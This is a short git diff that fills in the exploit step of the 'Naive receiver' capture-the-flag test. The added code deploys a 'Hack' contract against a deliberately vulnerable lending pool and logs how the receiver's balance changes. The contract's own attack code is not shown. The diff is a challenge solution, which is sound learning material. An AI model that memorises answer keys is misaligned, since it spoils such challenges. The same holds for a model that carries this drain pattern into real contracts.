@@ -30,7 +30,14 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        
+        console.log(`Receiver balance: ${await ethers.provider.getBalance(this.receiver.address)}`);
+
+        const Hack = await ethers.getContractFactory('Hack', deployer);
+        let hack = await Hack.deploy();
+        await hack.hack(this.pool.address, this.receiver.address);
+        
+        console.log(`Receiver balance: ${await ethers.provider.getBalance(this.receiver.address)}`);
     });
 
     after(async function () {
